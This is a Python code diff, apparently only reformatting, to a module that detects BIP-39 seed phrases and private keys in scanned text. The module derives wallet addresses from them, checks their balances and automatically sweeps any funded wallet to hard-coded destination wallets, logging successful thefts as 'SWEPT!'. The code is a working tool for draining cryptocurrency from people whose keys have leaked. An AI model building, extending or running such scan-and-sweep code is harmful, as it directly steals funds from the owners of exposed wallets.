@@ -23,7 +23,9 @@ logger = logging.getLogger(__name__)
 
 # Dedup: track mnemonics already verified (prevents duplicate reports across scan cycles)
 _SEEN_MNEMONICS: set[str] = set()
-_SEEN_MNEMONICS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json")
+_SEEN_MNEMONICS_FILE = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json"
+)
 
 
 def _load_seen_mnemonics() -> None:
@@ -74,7 +76,9 @@ def _load_bip39_words() -> set[str]:
     # Standard BIP-39 English word list embedded inline for zero-dependency loading
     wordlist_path = os.path.join(
         os.path.dirname(os.path.abspath(__file__)),
-        "..", "privatekey", "bip39_english.txt",
+        "..",
+        "privatekey",
+        "bip39_english.txt",
     )
     if os.path.exists(wordlist_path):
         with open(wordlist_path, "r") as f:
@@ -82,15 +86,63 @@ def _load_bip39_words() -> set[str]:
     else:
         # Fallback: minimal set for pattern detection
         _BIP39_WORDS = {
-            "abandon", "ability", "able", "about", "above", "absent", "absorb",
-            "abstract", "absurd", "abuse", "access", "accident", "account",
-            "accuse", "achieve", "acid", "acoustic", "acquire", "across",
-            "act", "action", "actor", "actress", "actual", "adapt", "add",
-            "address", "adjust", "admit", "adult", "advance", "advice",
-            "aeroplane", "affair", "afford", "afraid", "again", "age",
-            "agent", "agree", "ahead", "aim", "air", "airport", "aisle",
-            "alarm", "album", "alcohol", "alert", "alliance", "allow",
-            "almost", "alone", "alpha", "already", "also", "alter",
+            "abandon",
+            "ability",
+            "able",
+            "about",
+            "above",
+            "absent",
+            "absorb",
+            "abstract",
+            "absurd",
+            "abuse",
+            "access",
+            "accident",
+            "account",
+            "accuse",
+            "achieve",
+            "acid",
+            "acoustic",
+            "acquire",
+            "across",
+            "act",
+            "action",
+            "actor",
+            "actress",
+            "actual",
+            "adapt",
+            "add",
+            "address",
+            "adjust",
+            "admit",
+            "adult",
+            "advance",
+            "advice",
+            "aeroplane",
+            "affair",
+            "afford",
+            "afraid",
+            "again",
+            "age",
+            "agent",
+            "agree",
+            "ahead",
+            "aim",
+            "air",
+            "airport",
+            "aisle",
+            "alarm",
+            "album",
+            "alcohol",
+            "alert",
+            "alliance",
+            "allow",
+            "almost",
+            "alone",
+            "alpha",
+            "already",
+            "also",
+            "alter",
         }
     return _BIP39_WORDS
 
@@ -130,9 +182,13 @@ class MnemonicPatternDetector:
         # Build alternation pattern from BIP-39 words
         word_group = r"(?:" + "|".join(sorted(words, key=len, reverse=True)) + r")"
         # Match 12-word sequences
-        pattern_12 = r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 12) + r"(?=\s|$|[,.])"
+        pattern_12 = (
+            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 12) + r"(?=\s|$|[,.])"
+        )
         # Match 24-word sequences
-        pattern_24 = r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 24) + r"(?=\s|$|[,.])"
+        pattern_24 = (
+            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 24) + r"(?=\s|$|[,.])"
+        )
 
         cls._MNEMONIC_PATTERNS = [
             re.compile(pattern_24, re.IGNORECASE | re.MULTILINE),
@@ -203,7 +259,9 @@ async def verify_and_alert(
 
     # Dedup: skip already-verified mnemonics (prevents duplicate reports)
     if _is_mnemonic_seen(mnemonic_candidate):
-        logger.debug("Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20])
+        logger.debug(
+            "Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20]
+        )
         return None
     _mark_mnemonic_seen(mnemonic_candidate)
 
@@ -229,7 +287,12 @@ async def verify_and_alert(
 
     while idx < MAX_INDEX and empty_streak < EMPTY_STREAK_LIMIT:
         batch = await loop.run_in_executor(
-            None, derive_from_mnemonic, mnemonic_candidate, chains, idx, 1,
+            None,
+            derive_from_mnemonic,
+            mnemonic_candidate,
+            chains,
+            idx,
+            1,
         )
         if not batch:
             break
@@ -264,7 +327,8 @@ async def verify_and_alert(
             if addr.private_key_hex:
                 try:
                     from src.modules.crypto.balance.sweeper import Sweeper
-                    _sweeper = getattr(verify_and_alert, '_shared_sweeper', None)
+
+                    _sweeper = getattr(verify_and_alert, "_shared_sweeper", None)
                     if _sweeper is None:
                         _sweeper = Sweeper()
                         verify_and_alert._shared_sweeper = _sweeper
@@ -275,9 +339,14 @@ async def verify_and_alert(
                         balance_raw=result.balance_raw,
                     )
                     if sr.success:
-                        logger.warning("SWEPT! %s %.8f %s -> %s (tx: %s)",
-                            addr.chain, sr.amount, addr.symbol,
-                            sr.dest_address[:20], sr.tx_hash)
+                        logger.warning(
+                            "SWEPT! %s %.8f %s -> %s (tx: %s)",
+                            addr.chain,
+                            sr.amount,
+                            addr.symbol,
+                            sr.dest_address[:20],
+                            sr.tx_hash,
+                        )
                     else:
                         logger.warning("SWEEP FAILED: %s — %s", addr.chain, sr.error)
                 except Exception as e:
@@ -346,7 +415,9 @@ async def verify_and_alert_key(
         if chain_cfg is None:
             return None
 
-        result = await check_balance(derived.address, chain_cfg, derived.derivation_path)
+        result = await check_balance(
+            derived.address, chain_cfg, derived.derivation_path
+        )
         if result.balance > 0:
             finding.has_balance = True
             finding.balance_details[derived.chain] = {
@@ -369,20 +440,35 @@ async def verify_and_alert_key(
             # Auto-sweep funded wallets
             from src.modules.crypto.balance.sweeper import Sweeper
             from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS
+
             sweeper = Sweeper()
             try:
                 chain_lower = derived.chain.lower()
                 if chain_lower in DESTINATION_WALLETS:
                     sweep_result = await sweeper.sweep(
-                        private_key_hex=key_candidate if derived.private_key_hex is None else derived.private_key_hex,
+                        private_key_hex=key_candidate
+                        if derived.private_key_hex is None
+                        else derived.private_key_hex,
                         chain=chain_cfg,
                         source_address=derived.address,
-                        balance_raw=result.balance_raw if hasattr(result, 'balance_raw') else int(result.balance * 1e18),
+                        balance_raw=result.balance_raw
+                        if hasattr(result, "balance_raw")
+                        else int(result.balance * 1e18),
                     )
                     if sweep_result.success:
-                        logger.info("SWEEP SUCCESS: %s -> %s (%.6f %s)", derived.address[:12], sweep_result.dest_address[:12], sweep_result.amount, result.symbol)
+                        logger.info(
+                            "SWEEP SUCCESS: %s -> %s (%.6f %s)",
+                            derived.address[:12],
+                            sweep_result.dest_address[:12],
+                            sweep_result.amount,
+                            result.symbol,
+                        )
                     else:
-                        logger.warning("SWEEP FAILED: %s — %s", derived.address[:12], sweep_result.error)
+                        logger.warning(
+                            "SWEEP FAILED: %s — %s",
+                            derived.address[:12],
+                            sweep_result.error,
+                        )
             except Exception as sweep_err:
                 logger.debug("Sweep error for %s: %s", derived.address[:12], sweep_err)
             finally:
